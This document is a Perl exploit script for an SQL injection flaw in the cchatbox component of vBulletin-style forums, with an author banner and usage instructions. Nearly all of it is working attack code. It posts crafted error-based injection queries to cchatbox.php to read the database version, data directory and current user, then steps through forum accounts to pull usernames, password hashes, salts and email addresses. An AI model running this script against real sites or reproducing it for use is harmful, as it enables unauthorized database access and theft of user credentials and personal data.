?#!/usr/bin/perl
use LWP::UserAgent;
$ua = LWP::UserAgent->new;
$ua->agent("MyApp/0.1 ");
print "##################################\n";
print "############ EXPLOIT #############\n";
print "##################################\n";
print "## Portal: cchatbox             ##\n";
print "## Bug: SQLI                    ##\n";
print "## Author: DSecurity            ##\n";
print "## Coder: vv0lll                ##\n";
print "##################################\n";
	
print "Use: exploit.pl address number_user sleeptime\n";
print "Example: exploit.pl http://localhost/vbb 10 10\n";
if(@ARGV < 2) {exit;}
print "\n\n================================================\n";
#Foot print
print v_request('MySQL version: ','@@version');
print v_request('Data dir: ','@@datadir');
print v_request('User: ','user()');
print v_request('Database: ','database()');  
	
#Get user
for($i=1;$i<=$ARGV[1];$i++){
	print "-----------------------------------------\n";
	print $id = v_request('ID: ','userid','user','1',$i-1);
	if($id =~ /(ID:)\s(.*)/){
		print v_request('Group: ','usergroupid','user','userid='.$2);
		print v_request('Username: ','username','user','userid='.$2);
		print v_request('Password: ','password','user','userid='.$2);
		print v_request('Salt: ','salt','user','userid='.$2);
		print v_request('Email: ','email','user','userid='.$2);
	}
			
		}

print $ARVG[0];
sub v_request{
	#Declare
	$print = $_[0];
	$select = $_[1];
	$from = $_[2];
	$where = $_[3];
	$limit = $_[4];
	$sleep = $ARGV[2];
	if ($from eq '') {$from = 'information_schema.tables';}
	if ($where eq '') {$where = '1';}
	if ($limit eq '') {$limit = '0';}
	if ($sleep eq '') {$sleep = '10';}
	
	# Create a request
	my $req = HTTP::Request->new(POST => $ARGV[0].'/cchatbox.php');
	$req->content_type('application/x-www-form-urlencoded');
	$req->content('do=edit&messageid=0 and (SELECT 1 FROM(SELECT COUNT(*),CONCAT((select '.$select.' from '.$from.' WHERE '.$where.' limit '.$limit.',1),FLOOR(RAND(1)*3))x FROM information_schema.tables GROUP BY x)a)');

	# Pass request to the user agent and get a response back
	my $res = $ua->request($req);
	#print $res->content;
	if($res->content =~ /(MySQL Error)(.*?)'(.*?)0'(.*)/)
    {$test = $3};
	sleep($sleep);
	return $print.$test."\n";
}
